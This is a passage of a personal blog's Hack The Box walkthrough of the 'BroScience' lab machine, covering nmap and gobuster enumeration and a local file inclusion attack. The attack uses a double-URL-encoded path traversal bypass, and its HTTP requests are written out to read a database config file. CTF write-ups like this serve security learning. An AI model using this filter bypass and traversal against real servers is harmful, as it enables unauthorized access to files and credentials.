<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>BroScience HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="BroScience HTB Walkthrough"><meta property="og:description" content="Introduction A moderately challenging machine (for me at least) where we use a basic filter bypass to perform Local File Inclusion, allowing us to read a PHP web app&rsquo;s source code and uncover any insecure code. With this knowledge, we attack a poor attempt at randomness which was a new thing for me in a CTF environment, allowing us to register and activate an account. With login access, we exploit a theme via PHP object injection to get RCE."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-04-08-broscience-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-08T00:00:00+10:00"><meta property="article:modified_time" content="2023-04-08T17:05:55+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="BroScience HTB Walkthrough"><meta name=twitter:description content="Introduction A moderately challenging machine (for me at least) where we use a basic filter bypass to perform Local File Inclusion, allowing us to read a PHP web app&rsquo;s source code and uncover any insecure code. With this knowledge, we attack a poor attempt at randomness which was a new thing for me in a CTF environment, allowing us to register and activate an account. With login access, we exploit a theme via PHP object injection to get RCE."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-04-08-broscience-htb/><link rel=prev href=https://emdwyer.github.io/2023-03-11-mentor/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"BroScience HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-04-08-broscience-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, ctf, php, deserialization, injection","wordcount":6649,"url":"https:\/\/emdwyer.github.io\/2023-04-08-broscience-htb\/","datePublished":"2023-04-08T00:00:00+10:00","dateModified":"2023-04-08T17:05:55+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BroScience HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-04-08>2023-04-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;6649 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;32 minutes&nbsp;<span id=/2023-04-08-broscience-htb/ class=leancloud_visitors data-flag-title="BroScience HTB Walkthrough">
<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#foothold>Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./broscience.png data-srcset="./broscience.png, ./broscience.png 1.5x, ./broscience.png 2x" data-sizes=auto alt=./broscience.png title=Broscience></p><h2 id=introduction>Introduction</h2><p>A moderately challenging machine (for me at least) where we use a basic filter bypass to perform Local File Inclusion, allowing us to read a PHP web app&rsquo;s source code and uncover any insecure code. With this knowledge, we attack a poor attempt at randomness which was a new thing for me in a CTF environment, allowing us to register and activate an account. With login access, we exploit a theme via PHP object injection to get RCE. From here, we can dump and crack credentials from a database connection string we found earlier allowing us to privilege escalate from <code>www-data</code> to a real user. Finally, we then rely on write access to a location where a cron job looks for certificates for renewal &ndash; and exploit this script via command injection to get root access.</p><h2 id=enumeration>Enumeration</h2><p>We start with an <code>nmap</code> scan to find running and accessible services:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.195
</span></span><span class=line><span class=cl>Starting Nmap 7.92 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-01-28 18:27 AEDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.195
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.90s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     Apache httpd 2.4.54
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://broscience.htb/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.54 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>443/tcp open  ssl/http Apache httpd 2.4.54 <span class=o>((</span>Debian<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.54 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-cookie-flags: 
</span></span><span class=line><span class=cl><span class=p>|</span>   /: 
</span></span><span class=line><span class=cl><span class=p>|</span>     PHPSESSID: 
</span></span><span class=line><span class=cl><span class=p>|</span>_      httponly flag not <span class=nb>set</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>broscience.htb/organizationName<span class=o>=</span>BroScience/countryName<span class=o>=</span>AT
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-07-14T19:48:36
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2023-07-14T19:48:36
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: BroScience : Home
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>Service Info: Host: broscience.htb<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 19.93 seconds
</span></span></code></pre></td></tr></table></div></div><p>We add broscience.htb into our <code>/etc/hosts</code> and browse there to follow the redirect. We&rsquo;re greeted with &ndash; well, a blog about bros.. and science.. and bro science, where each URL is for a particular exercise of the format <code>https://broscience.htb/exercise.php?id=11</code></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-18-29-46-image.png data-srcset="./assets/2023-01-28-18-29-46-image.png, ./assets/2023-01-28-18-29-46-image.png 1.5x, ./assets/2023-01-28-18-29-46-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-18-29-46-image.png title=./assets/2023-01-28-18-29-46-image.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-18-31-21-image.png data-srcset="./assets/2023-01-28-18-31-21-image.png, ./assets/2023-01-28-18-31-21-image.png 1.5x, ./assets/2023-01-28-18-31-21-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-18-31-21-image.png title=./assets/2023-01-28-18-31-21-image.png></p><p>Attempting to leave a comment redirects me to a login page. URLs show us this is a PHP app, and we&rsquo;re on Apache/2.4.54 based on response headers. Our login page is shown below:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-18-32-46-image.png data-srcset="./assets/2023-01-28-18-32-46-image.png, ./assets/2023-01-28-18-32-46-image.png 1.5x, ./assets/2023-01-28-18-32-46-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-18-32-46-image.png title=./assets/2023-01-28-18-32-46-image.png></p><p>Gobuster scan to enumerate the web server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -u https://broscience.htb/ -w /usr/share/dirb/wordlists/big.txt -k
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     https://broscience.htb/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/big.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/01/28 18:44:14 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 280<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 280<span class=o>]</span>
</span></span><span class=line><span class=cl>/images               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 319<span class=o>]</span> <span class=o>[</span>--&gt; https://broscience.htb/images/<span class=o>]</span>
</span></span><span class=line><span class=cl>/includes             <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 321<span class=o>]</span> <span class=o>[</span>--&gt; https://broscience.htb/includes/<span class=o>]</span>
</span></span><span class=line><span class=cl>/javascript           <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 323<span class=o>]</span> <span class=o>[</span>--&gt; https://broscience.htb/javascript/<span class=o>]</span>
</span></span><span class=line><span class=cl>/manual               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 319<span class=o>]</span> <span class=o>[</span>--&gt; https://broscience.htb/manual/<span class=o>]</span>    
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 280<span class=o>]</span>                                         
</span></span><span class=line><span class=cl>/styles               <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 319<span class=o>]</span> <span class=o>[</span>--&gt; https://broscience.htb/styles/<span class=o>]</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/01/28 18:45:03 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=foothold>Foothold</h2><p>We can see directory listings, and within <a href=https://broscience.htb/includes/ target=_blank rel="noopener noreffer">https://broscience.htb/includes/</a> , there is an img.php. Navigating to <a href=https://broscience.htb/includes/img.php target=_blank rel="noopener noreffer">https://broscience.htb/includes/img.php</a> shows a &ldquo;missing path&rdquo; error, and attempting path traversal on the path query parameter shows &ldquo;attack detected&rdquo;.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-18-47-33-image.png data-srcset="./assets/2023-01-28-18-47-33-image.png, ./assets/2023-01-28-18-47-33-image.png 1.5x, ./assets/2023-01-28-18-47-33-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-18-47-33-image.png title=./assets/2023-01-28-18-47-33-image.png></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-18-48-04-image.png data-srcset="./assets/2023-01-28-18-48-04-image.png, ./assets/2023-01-28-18-48-04-image.png 1.5x, ./assets/2023-01-28-18-48-04-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-18-48-04-image.png title=./assets/2023-01-28-18-48-04-image.png></p><p>I wondered if this was a clue, and if we could URL encode or otherwise encode the path value to bypass this filter, perhaps? At this point, I started searching for directory traversal filter bypassing and came across <a href=https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki target=_blank rel="noopener noreffer">Advanced Directory Traversal filter bypassing</a>.</p><p>I tried a few techniques, including encoding dots, and at best would receive a 200 response wth an empty body. In addition, some strings such as &lsquo;passwd&rsquo; will trigger the above error message.</p><p>Back tracking slightly to gather more data, each exercise is posted by a user id and clicking on a username will load URL <a href="https://broscience.htb/user.php?id=X" target=_blank rel="noopener noreffer">https://broscience.htb/user.php?id=X</a></p><p>I am able to enumerate from id 1 to 5, which gives me the following users with attributes &ndash; which may be useful later on?:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>administrator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Member since
</span></span><span class=line><span class=cl>    4 years ago
</span></span><span class=line><span class=cl>Email Address
</span></span><span class=line><span class=cl>    administrator@broscience.htb
</span></span><span class=line><span class=cl>Total exercises posted
</span></span><span class=line><span class=cl>    138 
</span></span><span class=line><span class=cl>Total comments posted
</span></span><span class=line><span class=cl>    46 
</span></span><span class=line><span class=cl>Is activated
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>Is admin
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>bill
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Member since
</span></span><span class=line><span class=cl>    4 years ago
</span></span><span class=line><span class=cl>Email Address
</span></span><span class=line><span class=cl>    bill@broscience.htb
</span></span><span class=line><span class=cl>Total exercises posted
</span></span><span class=line><span class=cl>    92 
</span></span><span class=line><span class=cl>Total comments posted
</span></span><span class=line><span class=cl>    46 
</span></span><span class=line><span class=cl>Is activated
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>Is admin
</span></span><span class=line><span class=cl>    No 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>michael
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Member since
</span></span><span class=line><span class=cl>    2 years ago
</span></span><span class=line><span class=cl>Email Address
</span></span><span class=line><span class=cl>    michael@broscience.htb
</span></span><span class=line><span class=cl>Total exercises posted
</span></span><span class=line><span class=cl>    92 
</span></span><span class=line><span class=cl>Total comments posted
</span></span><span class=line><span class=cl>    46 
</span></span><span class=line><span class=cl>Is activated
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>Is admin
</span></span><span class=line><span class=cl>    No 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>john
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Member since
</span></span><span class=line><span class=cl>    1 year ago
</span></span><span class=line><span class=cl>Email Address
</span></span><span class=line><span class=cl>    john@broscience.htb
</span></span><span class=line><span class=cl>Total exercises posted
</span></span><span class=line><span class=cl>    46 
</span></span><span class=line><span class=cl>Total comments posted
</span></span><span class=line><span class=cl>    138 
</span></span><span class=line><span class=cl>Is activated
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>Is admin
</span></span><span class=line><span class=cl>    No 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>dmytro
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Member since
</span></span><span class=line><span class=cl>    1 year ago
</span></span><span class=line><span class=cl>Email Address
</span></span><span class=line><span class=cl>    dmytro@broscience.htb
</span></span><span class=line><span class=cl>Total exercises posted
</span></span><span class=line><span class=cl>    0 
</span></span><span class=line><span class=cl>Total comments posted
</span></span><span class=line><span class=cl>    0 
</span></span><span class=line><span class=cl>Is activated
</span></span><span class=line><span class=cl>    Yes 
</span></span><span class=line><span class=cl>Is admin
</span></span><span class=line><span class=cl>    No 
</span></span></code></pre></td></tr></table></div></div><p>Looking back, I decided to try the filter bypass on a known working file - <code>images/bench.png</code> &ndash; the below actually works, and gives me the image file as per those files in <a href=https://broscience.htb/images target=_blank rel="noopener noreffer">https://broscience.htb/images</a> &ndash; so double URL encoding a forward slash works as a filter bypass:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /includes/img.php?path=..%252Fimages%252Fbench.png HTTP/1.1
</span></span><span class=line><span class=cl>Host: broscience.htb
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=7tgk1lrrj4m6p5218rvb9i0t69
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Dnt: 1
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-Site: none
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Te: trailers
</span></span><span class=line><span class=cl>Connection: close
</span></span></code></pre></td></tr></table></div></div><p>As mentioned, our <code>gobuster</code> output shows <code>/includes</code> , which contains:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-01-28-19-55-05-image.png data-srcset="./assets/2023-01-28-19-55-05-image.png, ./assets/2023-01-28-19-55-05-image.png 1.5x, ./assets/2023-01-28-19-55-05-image.png 2x" data-sizes=auto alt=./assets/2023-01-28-19-55-05-image.png title=./assets/2023-01-28-19-55-05-image.png></p><p><code>db_connect.php</code> sounds interesting.. can we do a LFI (Local File Inclusion) and fetch it with <code>GET /includes/img.php?path=..%252Fincludes%252Fdb_connect.php HTTP/1.1</code> ? Yep!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Date: Sat, 28 Jan 2023 08:59:25 GMT
</span></span><span class=line><span class=cl>Server: Apache/2.4.54 (Debian)
</span></span><span class=line><span class=cl>Content-Length: 337
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: image/png
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$db_host = &#34;localhost&#34;;
</span></span><span class=line><span class=cl>$db_port = &#34;5432&#34;;
